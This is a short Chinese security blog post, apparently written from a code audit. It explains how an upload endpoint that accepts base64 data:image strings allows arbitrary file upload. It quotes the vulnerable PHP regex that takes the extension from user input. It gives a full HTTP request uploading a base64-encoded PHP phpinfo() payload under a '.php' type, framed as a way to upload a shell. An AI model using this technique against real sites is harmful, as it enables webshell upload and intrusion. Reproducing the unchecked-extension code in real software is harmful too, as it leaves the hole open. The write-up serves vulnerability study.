# 浅谈data:image格式文件上传

21年底和同学兼同事测试某个项目时，他曾问我图片上传时候数据包中以data:image格式来上传（读取）的，有没有什么方法上传shell呢，当时经验太少也没想出方法。

过了一年来回顾下这个问题，就以某CMS文件上传漏洞的源码为例分析一下。

## 代码逻辑

data:image能算作是一种编码格式，常用于图片的压缩，后面跟一串base64字符串。直接将data:image完整数据敲进浏览器栏里就能看到图片显示出来
[![pS3VEOe.png](https://s1.ax1x.com/2023/01/17/pS3VEOe.png)](https://imgse.com/i/pS3VEOe)

data:image格式的上传如果不严格校验文件后缀，会造成任意文件上传。以我之前审计的某CMS的文件上传漏洞为例，代码如下：
[![pS3VtTs.png](https://s1.ax1x.com/2023/01/17/pS3VtTs.png)](https://imgse.com/i/pS3VtTs)
src传入字符串，正则匹配两处字符串保存到matches数组中，第一处是格式，第二次是base64编码的数据

 - [ ] 代码
       
       preg_match("#^data:image/(\w+);base64,(.*)$#", $src, $matches)
       
       $base64 = $matches[2];
       
       $type = $matches[1];
       
       $filename = md5($base64).".$type";

最后保存预览文件到本地/preview目录下，文件名以md5格式进行命名，后缀为用户传入的后缀

因此可以构造如下数据包

 - [ ] 数据包
       
       POST /xxxx HTTP/1.1
       
       Host: xxxx
       
       Cache-Control: max-age=0
       
       Upgrade-Insecure-Requests: 1
       
       User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
       AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0
       Safari/537.36
       
       Accept:
       text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.9
       
       Accept-Encoding: gzip, deflate
       
       Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
       
       Cookie: PHPSESSID=0ufj3o7j0o7ovds8uuln7ho7m6
       
       Connection: close
       
       Content-Length: 46
       
       data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+

上传php格式base64编码的<?php phpinfo();?>进行验证

[![pS3V60J.png](https://s1.ax1x.com/2023/01/18/pS3V60J.png)](https://imgse.com/i/pS3V60J)
[![pS3Vym4.png](https://s1.ax1x.com/2023/01/18/pS3Vym4.png)](https://imgse.com/i/pS3Vym4)


## 知识星球推广

![image](https://github.com/youki992/youki992.github.io/blob/master/others/x.png)
